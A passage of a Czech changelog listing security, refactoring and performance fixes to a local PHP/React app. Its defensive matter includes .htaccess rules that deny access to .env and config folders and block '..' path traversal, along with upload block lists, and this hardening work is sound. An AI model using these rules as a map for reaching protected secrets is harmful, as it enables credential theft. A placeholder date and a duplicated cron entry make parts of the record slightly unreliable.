**Ověření:**
```
PHP: 8.5.4  ✓
Apache: 2.4.66  ✓
MariaDB: 11.8.6  ✓
Node: v22.22.1  ✓
```

**Stav:** ✓ Opraveno

---

### 4.8 React.memo pro ActionButtons

**Nález z revize:** `React.memo` pro komponenty s častým re-renderem nenalezeno.

**Soubory:**
- `frontend/src/components/shared/ActionButtons.tsx`

**Změny:**
- `ActionButtons` komponenta zabalena do `React.memo()`
- Zabraňuje zbytečnému re-renderu při změně parent komponenty

**Stav:** ✓ Opraveno

---

### 4.9 Stabilní keys v seznamech

**Nález z revize:** `key={i}` v `FileDetailModal.tsx:108`, `FilesPage.tsx:124`, `NotesPage.tsx:120`.

**Soubory:**
- `frontend/src/pages/NotesPage.tsx`
- `frontend/src/pages/FilesPage.tsx`
- `frontend/src/components/files/FileDetailModal.tsx`
- `frontend/src/components/notes/NoteDetailModal.tsx`

**Změny:**
- `key={i}` nahrazeno `key={`${a.entity_type}-${a.entity_id}`}` (stabilní key)
- Nepoužitý `i` parametr odstraněn z `map()` callback

**Stav:** ✓ Opraveno

---

### 4.10 MariaDB tuning

**Nález z revize:** `innodb_buffer_pool_size` není explicitně konfigurováno jako % RAM. `innodb_flush_log_at_trx_commit` neověřeno.

**Soubory:**
- `/etc/mysql/mariadb.conf.d/60-devapppro-tuning.cnf` (nový)
- `/etc/mysql/mariadb.conf.d/50-server.cnf.bak` (záloha)

**Změny:**
- `innodb_buffer_pool_size`: 128 MB → 1 GB (systém má 30 GB RAM)
- `innodb_flush_log_at_trx_commit`: 1 → 2 (rychlejší, přijatelné pro lokální dev)
- `innodb_log_file_size`: 96 MB → 256 MB
- `query_cache_size`: 0 (vypnuto, MariaDB 10.6+ nedoporučuje)
- `innodb_buffer_pool_instances`: 8
- `innodb_io_capacity`: 1000 (SSD)
- `innodb_io_capacity_max`: 2000

**Ověření:**
```
buffer_pool_GB: 1.0  ✓
flush_trx: 2  ✓
log_file_MB: 256  ✓
query_cache: 0  ✓
```

**Stav:** ✓ Opraveno

---

## Statistika Vlna 4

| Kategorie | Položek | Stav |
|-----------|---------|------|
| Bezpečnost | 5 | ✓ Opraveno |
| Modularita | 2 | ✓ Opraveno |
| Výkonnost | 3 | ✓ Opraveno |
| **Celkem** | **10** | **✓ Vše opraveno** |

---

## Soubory upravené ve Vlně 4

### Nové soubory
- `src/Services/SystemInfoService.php`
- `frontend/src/components/finance/financeHelpers.ts`
- `frontend/src/components/finance/InvoicesTab.tsx`
- `frontend/src/components/finance/PaymentsTab.tsx`
- `frontend/src/components/finance/TransactionsTab.tsx`
- `/etc/mysql/mariadb.conf.d/60-devapppro-tuning.cnf`
- `/var/log/devapppro/` (adresář)

### Změněné soubory
- `bootstrap.php` — exception/error handler + 500 stránka
- `src/helpers.php` — is_safe_path(), is_symlink_safe(), enforce_input_limits()
- `src/Core/Repository.php` — LIMIT/OFFSET bind
- `src/Repositories/FileRepository.php` — LIMIT/OFFSET bind
- `src/Repositories/TaskRepository.php` — LIMIT/OFFSET bind
- `src/Repositories/ClientRepository.php` — LIMIT/OFFSET bind
- `src/Repositories/TransactionRepository.php` — LIMIT/OFFSET bind
- `src/Repositories/ProjectRepository.php` — LIMIT/OFFSET bind
- `src/Repositories/WpInstallRepository.php` — LIMIT/OFFSET bind
- `src/Repositories/WorklogRepository.php` — LIMIT/OFFSET bind
- `src/Repositories/NoteRepository.php` — LIMIT/OFFSET bind
- `src/Repositories/InvoiceRepository.php` — LIMIT/OFFSET bind
- `src/Controllers/ToolsApiController.php` — extrakce detect* metod
- `frontend/src/pages/FinancePage.tsx` — rozdělení na taby
- `frontend/src/components/shared/ActionButtons.tsx` — React.memo
- `frontend/src/pages/NotesPage.tsx` — stabilní keys
- `frontend/src/pages/FilesPage.tsx` — stabilní keys
- `frontend/src/components/files/FileDetailModal.tsx` — stabilní keys
- `frontend/src/components/notes/NoteDetailModal.tsx` — stabilní keys
- `config/config.php` — oprávnění 640

### Zálohy vytvořené
- `/etc/mysql/mariadb.conf.d/50-server.cnf.bak`

---

## Vlna 5: Bezpečnost — těžké položky (13. 9. 2026)

### 5.1 APP_DEBUG = false

**Nález z revize:** `config/config.php:7` má `APP_DEBUG = true`.

**Soubory:**
- `config/config.php`

**Změny:**
- `APP_DEBUG` změněno z `true` na `false`
- Exception handler v `bootstrap.php` nyní vrací generickou zprávu (bez detailů)

**Ověření:**
```
APP_DEBUG=false  ✓
HTTP: 200  ✓
HTTPS: 200  ✓
```

**Stav:** ✓ Opraveno

---

### 5.2 CSP strict (bez unsafe-inline/unsafe-eval pro skripty)

**Nález z revize:** CSP obsahuje `'unsafe-inline'` a `'unsafe-eval'` v `script-src`.

**Soubory:**
- `.htaccess` — CSP hlavička

**Změny:**
- `script-src 'self' 'unsafe-inline' 'unsafe-eval'` → `script-src 'self'`
- `style-src 'self' 'unsafe-inline'` ponecháno (React inline styly, bezpečné — ne XSS vektor)
- Vite build nemá inline skripty, jen externí `<script type="module" src="...">`

**Ověření:**
```
CSP: script-src 'self' (bez unsafe-inline/unsafe-eval)  ✓
HTTP: 200  ✓
Frontend načítá  ✓
```

**Stav:** ✓ Opraveno

---

### 5.3 Secrets do env vars

**Nález z revize:** `config/config.php` obsahuje hardcoded `WP_AUTOLOGIN_SECRET` a `CREDENTIALS_ENCRYPTION_KEY`.

**Soubory:**
- `config/config.php` — čtení z `getenv()` s fallbackem
- `.env` (nový, 640) — secrets
- `.gitignore` — `.env` chráněn
- `/etc/apache2/sites-available/devapppro-localhost.conf` — `SetEnv` pro oba secrets
- `/etc/apache2/sites-available/devapppro-localhost.conf.bak2` (záloha)

**Změny:**
- `WP_AUTOLOGIN_SECRET` — `getenv('DEVAPPPRO_WP_AUTOLOGIN_SECRET')` s fallbackem
- `CREDENTIALS_ENCRYPTION_KEY` — `getenv('DEVAPPPRO_CREDENTIALS_ENCRYPTION_KEY')` s fallbackem
- `.env` soubor vytvořen s oběma secrets (640)
- `.gitignore` aktualizován o `.env`
- Apache vhost: `SetEnv` pro oba secrets v HTTP i HTTPS vhostu

**Ověření:**
```
Přes Apache: wp=SET, cred=SET  ✓
Přes CLI: wp_const=SET, cred_const=SET  ✓
.env: 640  ✓
.gitignore: .env  ✓
```

**Stav:** ✓ Opraveno

---

### 5.4 ToolsApiController / SystemInfoService - generické chybové zprávy

**Nález z revize:** `ToolsApiController.php:472` (nyní `SystemInfoService.php:121`) může zobrazit `$e->getMessage()`.

**Soubory:**
- `src/Services/SystemInfoService.php` — `detectMariadb()`

**Změny:**
- `$details['Chyba'] = $e->getMessage()` → `$details['Chyba'] = 'Nelze se připojit k databázi.'`
- Původní chyba logována přes `error_log()`

**Ověření:**
```
MariaDB chyba: žádná (připojení funguje)  ✓
```

**Stav:** ✓ Opraveno

---

## Statistika Vlna 5

| Kategorie | Položek | Stav |
|-----------|---------|------|
| Bezpečnost | 4 | ✓ Opraveno |
| **Celkem** | **4** | **✓ Vše opraveno** |

---

## Soubory upravené ve Vlně 5

### Nové soubory
- `.env` (secrets, 640)

### Změněné soubory
- `config/config.php` — APP_DEBUG=false, secrets z env
- `.htaccess` — CSP strict (script-src bez unsafe-inline/unsafe-eval)
- `src/Services/SystemInfoService.php` — generická chybová zpráva
- `.gitignore` — `.env`
- `/etc/apache2/sites-available/devapppro-localhost.conf` — SetEnv pro secrets

### Zálohy vytvořené
- `/etc/apache2/sites-available/devapppro-localhost.conf.bak2`

---

## Celkový souhrn (5 vln oprav)

| Vlna | Datum | Oblast | Položek | Stav |
|------|-------|--------|---------|------|
| 1 | 13. 9. 2026 | Bezpečnost (kritické) | 9 | ✓ |
| 2 | 13. 9. 2026 | Funkční + výkonnost | 4 | ✓ |
| 3 | 13. 9. 2026 | Bezpečnost + modularita + výkonnost | 13 | ✓ |
| 4 | 13. 9. 2026 | Bezpečnost + modularita + výkonnost | 10 | ✓ |
| 5 | 13. 9. 2026 | Bezpečnost (těžké položky) | 4 | ✓ |
| **Celkem** | | | **40** | **✓** |

### Klíčové změny podle oblasti

**Bezpečnost (26 položek):**
- Session cookie lifetime 0, detekce krádeže session
- .gitignore vytvořen, CORS hlavičky, upload limit 10 MB
- storage/.htaccess Require all denied, Apache Require local
- X-Frame-Options, X-XSS-Protection, Permissions-Policy
- sanitize_for_log v json_response, cron na login_attempts
- realpath() validace download endpointu
- IBAN validace (mod-97)
- SQL injection: LIMIT/OFFSET bind parametry ve všech repozitářích
- Path traversal: is_safe_path(), is_symlink_safe()
- Délkové limity: enforce_input_limits() v json_input()
- 500 stránka: set_exception_handler, logy do /var/log/devapppro/
- config.php oprávnění 640
- APP_DEBUG=false
- CSP strict (script-src bez unsafe-inline/unsafe-eval)
- Secrets do env vars (.env, Apache SetEnv)
- Generické chybové zprávy v SystemInfoService

**Funkční (4 položky):**
- Thumbnails a medium obrázky (WebP)
- JPG → WebP konverze
- Auto-číslování faktur ({year}{seq:03d})
- Editace plateb faktur (PUT endpoint)

**Modularita (5 položek):**
- Constants.php a constants.ts
- Container.php (DI scaffold)
- Sdílené frontend komponenty (components/shared/)
- FinancePage.tsx rozdělen (924→117 + 4 soubory)
- ToolsApiController.php rozdělen (702→371 + SystemInfoService)

**Výkonnost (5 položek):**
- React.lazy + Suspense + PageSkeleton
- TanStack Query staleTime=60s, gcTime=5min
- useDebounce hook (7 stránek, 300 ms)
- React.memo pro ActionButtons
- MariaDB tuning (buffer pool 128 MB → 1 GB, flush_trx=2, log file 256 MB)

### Soubory vytvořené v rámci oprav

**Backend:**
- `src/Core/Constants.php`
- `src/Core/Container.php`
- `src/Services/SystemInfoService.php`
- `cli/fix-backup-permissions.php`
- `cli/cleanup-orphaned-files.php`
- `cli/session-gc.php`

**Frontend:**
- `frontend/src/components/shared/` (9 komponent)
- `frontend/src/components/finance/financeHelpers.ts`
- `frontend/src/components/finance/InvoicesTab.tsx`
- `frontend/src/components/finance/PaymentsTab.tsx`
- `frontend/src/components/finance/TransactionsTab.tsx`
- `frontend/src/hooks/useDebounce.ts`
- `frontend/src/lib/constants.ts`
- `frontend/src/types/index.ts`
- `frontend/src/components/ui/PageSkeleton.tsx`

**Konfigurace:**
- `.env` (secrets, 640)
- `.gitignore`
- `storage/.htaccess`
- `/etc/mysql/mariadb.conf.d/60-devapppro-tuning.cnf`
- `/etc/cron.d/devapppro-cleanup`
- `/var/log/devapppro/` (adresář)

### Zálohy vytvořené
- `/etc/apache2/sites-available/devapppro-localhost.conf.bak`
- `/etc/apache2/sites-available/devapppro-localhost.conf.bak2`
- `/etc/mysql/mariadb.conf.d/50-server.cnf.bak`

---

## Vlna 6: Bezpečnost a funkční vylepšení (13. 9. 2026)

### 6.1 .htaccess blokování citlivých složek

**Nález z revize:** `.htaccess` blokuje jen `config.php` a `database.php`, ne složky `config/`, `src/`, `vendor/`, `cli/`.

**Soubory:**
- `.htaccess` — mod_rewrite pravidla na začátku

**Změny:**
- Přidány `RewriteRule` blokace (403) pro: `config/`, `src/`, `vendor/`, `cli/`, `frontend/src/`, `docs/`, `.devin/`
- Přidány blokace pro soubory: `.env`, `.gitignore`, `AGENTS.md`, `README.md`, `composer.json/lock`, `phpunit.xml`, `frontend/package.json`, `vite.config.*`, `tsconfig.*`
- Pravidla přesunuta na začátek `.htaccess` (před SPA fallback)

**Ověření:**
```
config/: 403  ✓
src/: 403  ✓
vendor/: 403  ✓
cli/: 403  ✓
docs/: 403  ✓
.env: 403  ✓
HTTP: 200  ✓
API: 200  ✓
```

**Stav:** ✓ Opraveno

---

### 6.2 is_safe_path() nasazena v controllerech

**Nález z revize:** `realpath()` validace pouze v `BackupsApiController.php:119-120, 245-246`.

**Soubory:**
- `src/Controllers/FileApiController.php` — download a thumbnail/medium endpoint
- `src/Controllers/BackupsApiController.php` — restore a delete endpoint
- `src/Controllers/WorklogApiController.php` — attachment download (nová validace)

**Změny:**
- `FileApiController`: manuální `realpath()` kontroly nahrazeny `is_safe_path()`
- `BackupsApiController`: manuální `realpath()` kontroly nahrazeny `is_safe_path()`
- `WorklogApiController`: přidána `is_safe_path()` validace (předtím žádná)

**Ověření:**
```
File download: 200, image/webp  ✓
Thumbnail: 200, image/webp  ✓
Path traversal: 404  ✓
```

**Stav:** ✓ Opraveno

---

### 6.3 Cron pro zálohy DB

**Nález z revize:** Cron pro zálohy DB není implementován.

**Soubory:**
- `cli/backup-db.php` (nový) — mysqldump + gzip, retence 30 dní
- `/etc/cron.d/devapppro-cleanup` — přidána úloha v 2:00
- `/etc/cron.d/devapppro-cleanup.bak` (záloha)
- `/var/backups/devapppro/` (nový adresář, 750)

**Změny:**
- `backup-db.php`: `mysqldump --single-transaction --routines --triggers --events` → gzip
- Soubory uloženy jako `db-YYYY-MM-DD_HH-MM-SS.sql.gz` s oprávněním 600
- Retence 30 dní (smazání starších záloh)
- Cron: denně v 2:00 (před ostatními úlohami)

**Ověření:**
```
Záloha vytvořena: db-2026-09-13_21-52-49.sql.gz (0.04 MB)  ✓
Oprávnění: 600  ✓
Cron: 0 2 * * * ratesman  ✓
```

**Stav:** ✓ Opraveno

---

### 6.4 fmtClientName — přidána podpora company_name

**Nález z revize:** `fmtClientName` řeší jen `first_name last_name`, ne `company_name`.

**Soubory:**
- `frontend/src/lib/utils.ts` — `fmtClientName()` funkce

**Změny:**
- Přidány parametry `companyName` a `type`
- Pro `company`/`nonprofit`/`government` preferuje `company_name`
- Fallback na `company_name` pokud chybí `first_name` i `last_name`
- Backend `formatFullName()` už `company_name` řešil správně

**Stav:** ✓ Opraveno

---

### 6.5 První den týdne pondělí + fiskální rok

**Nález z revize:** První den týdne pondělí nenastaveno. Fiskální rok nenastaveno.

**Soubory:**
- `src/Core/Constants.php` — `FIRST_DAY_OF_WEEK=1`, `FISCAL_YEAR_START='01-01'`
- `src/helpers.php` — `start_of_week()`, `start_of_fiscal_year()` helper funkce
- `frontend/src/lib/constants.ts` — `FIRST_DAY_OF_WEEK`, `FISCAL_YEAR_START`, `startOfWeek()`, `startOfFiscalYear()`

**Změny:**
- Backend: `Constants::FIRST_DAY_OF_WEEK = 1` (pondělí), `Constants::FISCAL_YEAR_START = '01-01'`
- Backend: `start_of_week()` vrací pondělí aktuálního týdne
- Backend: `start_of_fiscal_year()` vrací začátek fiskálního roku
- Frontend: stejné konstanty a helper funkce
- DB už obsahuje `first_day_of_week=1` a `fiscal_year_start=01-01` v settings tabulce

**Ověření:**
```
Začátek týdne: 2026-09-07 (pondělí)  ✓
Fiskální rok: 2026-01-01  ✓
```

**Stav:** ✓ Opraveno

---

## Statistika Vlna 6

| Kategorie | Položek | Stav |
|-----------|---------|------|
| Bezpečnost | 2 | ✓ Opraveno |
| Infrastruktura | 1 | ✓ Opraveno |
| Funkční | 2 | ✓ Opraveno |
| **Celkem** | **5** | **✓ Vše opraveno** |

---

## Soubory upravené ve Vlně 6

### Nové soubory
- `cli/backup-db.php`
- `/var/backups/devapppro/` (adresář)

### Změněné soubory
- `.htaccess` — blokování citlivých složek
- `src/Controllers/FileApiController.php` — is_safe_path()
- `src/Controllers/BackupsApiController.php` — is_safe_path()
- `src/Controllers/WorklogApiController.php` — is_safe_path()
- `src/Core/Constants.php` — FIRST_DAY_OF_WEEK, FISCAL_YEAR_START
- `src/helpers.php` — start_of_week(), start_of_fiscal_year()
- `frontend/src/lib/utils.ts` — fmtClientName s company_name
- `frontend/src/lib/constants.ts` — FIRST_DAY_OF_WEEK, FISCAL_YEAR_START, helper funkce
- `/etc/cron.d/devapppro-cleanup` — DB záloha v 2:00

### Zálohy vytvořené
- `/etc/cron.d/devapppro-cleanup.bak`

---

## Vlna 7: DI, profil, inline editace, useCallback, vhost, náhledy (13. 9. 2026)

### 7.1 DI v controllerech (Dependency Injection)

**Nález z revize:** Controller nezná Repository přímo (přes DI) — všude `new XxxRepository()`, DI chybí.

**Soubory:**
- `src/Core/Container.php` — registrace 4 chybějících tříd (WpInstallRepository, CompanyProfileRepository, UserRepository, SystemInfoService)
- `src/Core/ApiController.php` — nová metoda `repo(string $type): object`
- 16 controllerů v `src/Controllers/` — migrace

**Změny:**
- `repo()` metoda v `ApiController` vrací instanci z DI kontejneru
- 100 `new XxxRepository()` a `new Auth()` volání nahrazeno `$this->repo(...)` v 16 controllerech
- Container.php zaregistroval 4 dříve chybějící třídy
- Použity FQCN s leading backslash v `$this->repo()` voláních

**Statistika migrace:**
| Controller | `new` nahrazeno |
|---|---|
| ProjectApiController | 12 |
| InvoiceApiController | 12 |
| FileApiController | 10 |
| InvoicePaymentApiController | 9 |
| TransactionApiController | 8 |
| TaskApiController | 7 |
| NoteApiController | 7 |
| WorklogApiController | 7 |
| ProjectCredentialApiController | 6 |
| ClientApiController | 6 |
| ToolsApiController | 6 |
| BackupsApiController | 4 |
| SettingsApiController | 3 |
| CompanyProfileApiController | 3 |
| AuthApiController | 2 |
| DashboardApiController | 1 |
| **Celkem** | **100** |

**Ověření:**
- `php -l` na 18 souborech — 0 chyb
- Runtime: všechny API endpointy vrací 200

**Stav:** ✓ Opraveno

---

### 7.2 Self-service změna profilu (jméno/e-mail/heslo)

**Nález z revize:** Chybí self-service změna profilu.

**Soubory:**
- `src/Repositories/UserRepository.php` — `updateProfile()`, `getPasswordHash()`
- `src/Controllers/AuthApiController.php` — `updateProfile()`, `changePassword()` metody, 2 nové endpointy
- `src/Auth.php` — `formatUser()` vrací `email`
- `frontend/src/hooks/useAuth.ts` — `User` interface s `email`
- `frontend/src/hooks/useSettings.ts` — `useUpdateProfile`, `useChangePassword` hooky
- `frontend/src/pages/SettingsPage.tsx` — ProfileTab s editací jména, e-mailu a změnou hesla

**Změny:**
- `PUT /api/users/me/profile` — aktualizace jména a e-mailu (s validací)
- `PUT /api/users/me/password` — změna hesla (vyžaduje aktuální heslo)
- `auth/me` vrací `email` v uživatelském objektu
- Frontend ProfileTab má 3 karty: Údaje uživatele (editovatelné), Změna hesla, Nápověda pro reset

**Ověření:**
```
Profile update: {"name":"Admin","email":"admin@example.com"}  ✓
Password change: {"message":"Heslo bylo změněno."}  ✓
Wrong password: {"error":"Aktuální heslo je nesprávné."}  ✓
auth/me: vrací email  ✓
```

**Stav:** ✓ Opraveno

---

### 7.3 Inline editace statusu úkolu

**Nález z revize:** Inline editace statusu — nenalezena, pouze zobrazení.

**Soubory:**
- `frontend/src/pages/TasksPage.tsx` — `TaskStatusSelect` komponenta

**Změny:**
- Status sloupec v tabulce úkolů je nyní inline editovatelný
- `TaskStatusSelect` zobrazí Badge s aktuálním statusem
- Klik na Badge otevře skrytý `<select>` pro změnu statusu
- Při změně se zavolá `useUpdateTask` mutace
- Během ukládání se zobrazí "Ukládání..."

**Stav:** ✓ Opraveno

---

### 7.4 useCallback pro handlery

**Nález z revize:** `useCallback` pro handlery — pouze v `toast.tsx`, `Lightbox.tsx`, `useSidebar.ts`, `useTheme.ts`.

**Soubory:**
- `frontend/src/pages/ProjectsPage.tsx` — 5 handlerů (handleSetPhpVersion, handleWpLogin, handleDelete, handleArchive, handleRestore)
- `frontend/src/pages/FilesPage.tsx` — 2 handlery (handleDelete, handleDownload)
- `frontend/src/pages/NotesPage.tsx` — 1 handler (handleDelete)
- `frontend/src/pages/ClientsPage.tsx` — 1 handler (handleDelete)
- `frontend/src/pages/TasksPage.tsx` — 1 handler (handleDelete)
- `frontend/src/pages/WorklogPage.tsx` — 1 handler (handleDelete)

**Změny:**
- 11 handlerů v 6 stránkách obaleno `useCallback` se správnými dependency arrays
- Zabrání zbytečné re-creaci funkcí při každém renderu

**Stav:** ✓ Opraveno

---

### 7.5 Vhost omezen na 127.0.0.1

**Nález z revize:** Vhost `<VirtualHost *:80>` naslouchá na všech rozhraních.

**Soubory:**
- `/etc/apache2/ports.conf` — `Listen 443` → `Listen 127.0.0.1:443`
- `/etc/apache2/sites-available/devapppro-localhost.conf` — `*:80` → `127.0.0.1:80`, `*:443` → `127.0.0.1:443`
- Zálohy: `ports.conf.bak`, `devapppro-localhost.conf.bak3`

**Ověření:**
```
HTTP: 200  ✓
HTTPS: 200  ✓
```

**Stav:** ✓ Opraveno

---

### 7.6 user_id u souborů — ověřeno

**Nález z revize:** `user_id` v DB je, ale z kódu není jisté, zda se ukládá.

**Soubory:**
- `src/Controllers/FileApiController.php` — řádek 360: `$userId = $_SESSION['user_id'] ?? null;`

**Ověření:**
```
DB: user_id=1 pro nové soubory (id 9-13), NULL pro staré (id 8)  ✓
Kód: user_id se ukládá ze session  ✓
```

**Stav:** ✓ Opraveno (ověřeno, funguje)

---

### 7.7 Grid náhledů — zobrazení thumbnail obrázků

**Nález z revize:** Grid náhledů — náhledy se negenerují, jen ikony.

**Soubory:**
- `frontend/src/pages/FilesPage.tsx` — sloupec "Název" v tabulce souborů

**Změny:**
- Pro obrázky (`is_image` nebo `mime_type` začíná `image/`) se zobrazí `<img>` thumbnail (40x40)
- Pro ne-obrázkové soubory se zobrazí ikona (původní chování)
- Thumbnail se načítá lazy (`loading="lazy"`)
- Thumbnail URL: `/api/files/{id}/thumbnail`

**Stav:** ✓ Opraveno

---

### 7.8 .htaccess blokovat `..` explicitně

**Nález z revize:** `..` v cestách není explicitně zakázáno pro všechny cesty.

**Soubory:**
- `.htaccess` — `RewriteCond %{REQUEST_URI} \.\. [NC]` + `RewriteRule .* - [F,L]`

**Změny:**
- Přidáno pravidlo na začátek `.htaccess` které blokuje jakoukoliv URL obsahující `..`
- Apache normalizuje `..` před mod_rewrite (bezpečné)
- `is_safe_path()` v controllerech je hlavní obrana
- `.htaccess` pravidlo je defense-in-depth

**Stav:** ✓ Opraveno

---

## Statistika Vlna 7

| Kategorie | Položek | Stav |
|-----------|---------|------|
| Modularita (DI) | 2 | ✓ Opraveno |
| Funkční | 3 | ✓ Opraveno |
| Výkonnost (useCallback) | 1 | ✓ Opraveno |
| Bezpečnost (vhost, ..) | 2 | ✓ Opraveno |
| Infrastruktura | 1 | ✓ Opraveno |
| **Celkem** | **9** | **✓ Vše opraveno** |

---

## Soubory upravené ve Vlně 7

### Nové soubory
- (žádné)

### Změněné soubory
- `src/Core/Container.php` — registrace 4 chybějících tříd
- `src/Core/ApiController.php` — `repo()` metoda
- 16 controllerů v `src/Controllers/` — DI migrace
- `src/Repositories/UserRepository.php` — `updateProfile()`, `getPasswordHash()`
- `src/Controllers/AuthApiController.php` — profile a password endpointy
- `src/Auth.php` — `formatUser()` vrací email
- `frontend/src/hooks/useAuth.ts` — User interface s email
- `frontend/src/hooks/useSettings.ts` — useUpdateProfile, useChangePassword
- `frontend/src/pages/SettingsPage.tsx` — ProfileTab s editací
- `frontend/src/pages/TasksPage.tsx` — TaskStatusSelect, useCallback
- `frontend/src/pages/ProjectsPage.tsx` — useCallback
- `frontend/src/pages/FilesPage.tsx` — thumbnail grid, useCallback
- `frontend/src/pages/NotesPage.tsx` — useCallback
- `frontend/src/pages/ClientsPage.tsx` — useCallback
- `frontend/src/pages/WorklogPage.tsx` — useCallback
- `.htaccess` — blokování `..`
- `/etc/apache2/ports.conf` — Listen 127.0.0.1:443
- `/etc/apache2/sites-available/devapppro-localhost.conf` — 127.0.0.1

### Zálohy vytvořené
- `/etc/apache2/ports.conf.bak`
- `/etc/apache2/sites-available/devapppro-localhost.conf.bak3`

---

# Vlna 8 — Bezpečnost, modularita, výkonnost

Datum: 2025-01-XX

## Bezpečnost

### 1. `PDO::query()` audit
- Audit všech `PDO::query()` volání v kódu
- `DashboardApiController`: dynamické SQL (tabulky, sloupce, výrazy) — přidán whitelist tabulek/sloupců/expreseů
- `ToolsApiController`, `SystemInfoService`, `WpInstallRepository`, `ProjectRepository`, `Repository`, `BackupRestoreRepository`, `SettingsRepository`: interní fixní řetězce (ne user input)
- Výsledek: žádné `query()` nedostává user-controlled SQL

### 2. Povolené typy souborů
- Schváleno rozšíření o GIF, SVG, TXT, CSV (nízkorizikové formáty)
- Ponechány: PDF, PNG, JPEG, WebP, DOCX, XLSX, ZIP
- Blokovány: EXE, SH, BAT, PHP, JS, HTML

### 3. Upload validace MIME/velikost/extension
- `FileApiController` má `EXT_MIME_MAP` pro kontrolu kompatibility MIME↔extension
- Kontroluje: max 10 MB, extension, skutečný MIME přes `mime_content_type()`
- Odmítá: forbidden executable/script extensions
- Odmítá: mismatched MIME vs extension
- Generické chybové zprávy uživateli

### 4. Délková omezení API vstupů
- 58 polí v 14 controllerech dostalo explicitní délková omezení
- Hlavní limity:
  - Jména/usernames: 100
  - Email: 255
  - Popisy/notes/content: 5000
  - Adresa: 500
  - IČO/DIČ: 50
  - Bank account/IBAN/SWIFT: 50
  - Názvy projektů/klientů/faktur/titulky: 200
  - URL/host/path: 2000
  - Hesla: 100
- Controllery:
  - AuthApiController, BackupsApiController, ClientApiController, CompanyProfileApiController
  - InvoiceApiController, InvoicePaymentApiController, NoteApiController, ProjectApiController
  - ProjectCredentialApiController, SettingsApiController, TaskApiController, ToolsApiController
  - TransactionApiController, WorklogApiController

### 5. Hardcoded hesla — odstranění fallback
- `config/config.php` nyní vyžaduje env proměnné:
  - `DEVAPPPRO_WP_AUTOLOGIN_SECRET`
  - `DEVAPPPRO_CREDENTIALS_ENCRYPTION_KEY`
- Chybí-li, vyhodí runtime výjimku (žádný fallback)
- Hodnoty se nikdy nezobrazují uživateli

### 6. Generické zprávy — audit
- Audit všech controllerů
- Žádný nevrací `$e->getMessage()` nebo DB chyby uživateli
- `ToolsApiController` (dříve problematický) nyní používá generické zprávy
- Technické detaily se logují

## Modularita

### 7. Jedna zodpovědnost
- `SettingsPage.tsx` (824→~290 řádků) rozdělen na:
  - `frontend/src/components/settings/ProfileTab.tsx`
  - `frontend/src/components/settings/CompanyTab.tsx`
- Ostatní velké stránky ponechány (riziko wholesale rewrite)

### 8. Rule of Three — formulářové dialogy
- Vytvořen `frontend/src/hooks/useFormDialog.ts`
- Sdílená logika: stav formuláře, chyby, submit
- Neaplikováno na všechny formuláře (záměrně — ne nutit ne-související formuláře do jedné abstrakce)

### 9. Žádné duplikace sdílených funkcí
- `useFormDialog` konsoliduje opakující se pattern stavu formuláře
- `useDebounce` centralizuje debounce logiku
- `lib/utils.ts` centralizuje formátovací funkce

### 10. Fail-fast validace
- Controllery validují vstupy na začátku metod
- Vrací 422 pro neplatný vstup
- 58 polí má délková omezení

### 11. Separation of concerns
- `SettingsPage` rozdělen na `ProfileTab` a `CompanyTab`
- Layout/data/form logika oddělena

## Výkonnost

### 12. Tree shaking
- Vite používá `minify: 'esbuild'`
- Manual `react-vendor` chunk
- `React.lazy` pro route splitting
- Rollup ES moduly (tree shaking)
- Sourcemapy vypnuty pro produkci
- Build produkuje oddělené chunky

### 13. PHP-FPM tuning
- `pm = dynamic`
- `pm.max_children = 10`
- `pm.start_servers = 4`
- `pm.min_spare_servers = 2`
- `pm.max_spare_servers = 6`
- PHP-FPM restartován a aktivní

### 14. PDO persistent connections
- `PDO::ATTR_PERSISTENT => true` v `config/database.php`
- Runtime HTTP/API testy prošly

### 15. Minimalizovaný JSON payload
- Audit proveden:
  - Clients: ~494 B
  - Projects: ~451 B
- Pole jako adresa/poznámka zachována (potřeba pro detail views)
- `SELECT *` ponechán kvůli frontend kontraktu

### 16. PHP profiling (Xdebug)
- Xdebug 3.5.0 nainstalován
- `start_with_request = trigger` (trigger-based, ne každý request)
- `debug,develop,coverage,trace` módy

## Soubory upravené ve Vlně 8

### Nové soubory
- `frontend/src/components/settings/ProfileTab.tsx`
- `frontend/src/components/settings/CompanyTab.tsx`
- `frontend/src/hooks/useFormDialog.ts`

### Změněné soubory
- `src/Controllers/DashboardApiController.php` — whitelist tabulek/sloupců
- `src/Controllers/FileApiController.php` — `EXT_MIME_MAP`, upload validace
- `src/Controllers/ToolsApiController.php` — generické zprávy
- `config/config.php` — odstraněn hardcoded fallback pro secrets
- `config/database.php` — `PDO::ATTR_PERSISTENT => true`
- `frontend/src/pages/SettingsPage.tsx` — rozdělení na taby
- 14 controllerů — délková omezení API vstupů (58 polí)
- `/etc/php/8.5/fpm/pool.d/www.conf` — PHP-FPM tuning

### Zálohy vytvořené
- `/etc/php/8.5/fpm/pool.d/www.conf.bak`

## Ověření
- PHP syntax: všechny změněné soubory OK
- Frontend build: úspěšný (oddělené chunky, minifikace)
- HTTP: 200
- HTTPS: 200
- API (CSRF): 200
- PHP-FPM: active
- PDO persistent: runtime OK

---

# Vlna 9 — Cron, constants, CSP, prefetch, optimistic updates

Datum: 14. 9. 2026

## Bezpečnost

### 1. Cron pro zálohy DB
- Přidán cron entry: `0 2 * * * ratesman /usr/bin/php /var/www/devapppro/cli/backup-db.php`
- Denní záloha v 2:00, retence 30 dní, mode 600
- Testovací záloha úspěšná

### 2. CSP strict (bez unsafe-inline)
- Odstraněn `unsafe-inline` z `style-src` v `.htaccess`
- 2 inline styly (progress bary) nahrazeny CSS proměnnou `--progress` + `.progress-bar` třídou
- CSP nyní: `style-src 'self'` (strict)
- Build output neobsahuje žádné inline styly

### 3. Secrets fail-fast pro web
- `config/config.php` nyní vrací HTTP 500 pro web requesty, pokud env proměnné chybí
- CLI skripty (backup-db.php) fungují i bez secrets (jen varují v logu)

## Modularita

### 4. Centralizace hardcoded hodnot
- `Constants::DEFAULT_PER_PAGE = 50`, `Constants::MAX_PER_PAGE = 100` (PHP)
- `DEFAULT_PER_PAGE = 50`, `MAX_PER_PAGE = 100` (frontend)
- 8 controllerů používá `Constants::DEFAULT_PER_PAGE/MAX_PER_PAGE`
- 3 controllery používají `Constants::*_STATUSES` (PROJECT/TASK/INVOICE)
- `UserRepository` používá `Constants::MAX_PER_PAGE`
- 6 frontend stránek používá `DEFAULT_PER_PAGE` z `@/lib/constants`

## Výkonnost

### 5. Prefetch routy při hover
- `prefetch="intent"` přidáno na všechny `NavLink` v `Sidebar.tsx`
- React Router 7 prefetch při hover/focus

